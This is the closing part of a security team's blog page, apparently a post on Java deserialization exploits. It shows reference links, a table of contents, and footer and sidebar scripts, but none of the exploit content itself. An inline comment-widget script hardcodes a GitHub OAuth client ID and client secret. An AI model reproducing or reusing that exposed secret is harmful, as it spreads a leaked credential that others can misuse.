+<li><p><a href="https://blog.csdn.net/wn084/article/details/80729230&gt;" target="_blank" rel="noopener">https://blog.csdn.net/wn084/article/details/80729230&gt;</a></p>
+</li>
+<li><p><a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">https://github.com/zerothoughts/spring-jndi</a></p>
+</li>
+<li><p><a href="https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html" target="_blank" rel="noopener">https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html</a></p>
+</li>
+</ul>
+
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" <i class="fa fa-tag">Web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/Writeup/SUCTF招新赛官方writeup/" rel="next" title="SUCTF招新赛官方writeup">
+                <i class="fa fa-chevron-left"></i> SUCTF招新赛官方writeup
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/uncategorized/XNUCA-qualifier-md/" rel="prev" title="XNUCA qualifier writeup">
+                XNUCA qualifier writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Susers">
+          <p class="site-author-name" itemprop="name">Susers</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">Posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/susers" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.bxsteam.xyz/" title="BXS Team" target="_blank">BXS Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://asuri.org/" title="Asuri Team" target="_blank">Asuri Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/SEU-ITE/" title="SEU-ITE" target="_blank">SEU-ITE</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#项目的依赖项配置"><span class="nav-number">1.</span> <span class="nav-text">项目的依赖项配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-common-collections"><span class="nav-number">2.</span> <span class="nav-text">Apache common collections</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pop链"><span class="nav-number">2.1.</span> <span class="nav-text">Pop链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE构造"><span class="nav-number">2.2.</span> <span class="nav-text">RCE构造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Spring-JNDI反序列化漏洞"><span class="nav-number">3.</span> <span class="nav-text">Spring JNDI反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是JNDI"><span class="nav-number">3.1.</span> <span class="nav-text">什么是JNDI?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring框架中的JNDI反序列化漏洞"><span class="nav-number">3.2.</span> <span class="nav-text">Spring框架中的JNDI反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc"><span class="nav-number">3.3.</span> <span class="nav-text">Poc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson反序列化漏洞"><span class="nav-number">4.</span> <span class="nav-text">fastjson反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-number">5.</span> <span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplatesImpl"><span class="nav-number">6.</span> <span class="nav-text">TemplatesImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">7.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">8.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Susers</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</span></div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共31.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script type="text/javascript">
+        (function() {
+            var id = '';
+            var owner = 'XuCcc';
+            var repo = 'XuCcc.github.io';
+            var clientId = 'f03b9d3d14222e890fdc';
+            var clientSecret = '676341561e48fad43015c644798175b16ee69fe0';
+
+            var gitment = new Gitment({
+                owner: owner,
+                repo: repo,
+                oauth: {
+                    client_id: clientId,
+                    client_secret: clientSecret,
+                },
+            });
+            gitment.render('comments');
+        })();
+    </script>
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
